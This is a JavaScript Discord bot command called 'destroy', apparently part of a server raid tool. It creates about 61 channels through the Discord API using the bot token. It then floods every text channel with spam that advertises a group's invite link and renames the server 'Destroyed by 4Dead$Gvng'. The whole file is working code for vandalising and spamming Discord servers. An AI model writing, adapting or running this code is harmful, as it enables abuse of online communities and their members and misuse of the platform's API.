const config = require("../config.json")
const axios = require("axios")

const channelCreate = config.channelCreate
const token = config.token
const spam = config.spamChannel

module.exports = {
  name: 'destroy',
  description: 'kill server with your config!',
  execute(message, args) {
    message.delete()

    for(let i = 0; i <= 60; i++){

        process.title = `Mass creation channels | Channels created: ${i}  | Bot raid created by yiko `

        axios.post(
        `https://discord.com/api/v9/guilds/${message.guild.id}/channels`, {
            name: `${channelCreate}`,
             type: 0,
             topic: `4Dead$Gvng x ${message.author.username}  | discord.gg/deadgxng`,
              },    
              {
                headers: {
                authorization: `Bot ${token}`,
                'Content-Type': 'application/json',
              }
        })

    }

  setTimeout( () => {
     message.guild.channels.cache.filter( channel => channel.type === 'text').map( async channel => {
      const SpamPromises = [];

      if(channel.type === 'text'){
            for(let i = 0; i <= 16; i++){

        SpamPromises.push(channel.send(`4Dead$Gvng on top discord.gg/deadgxng |  ${spam}`))
      }
    }
      await Promise.all(SpamPromises)
    })
  }, 5000)
    
message.guild.setName(`Destroyed by 4Dead$Gvng & ${message.author.username}`)

}}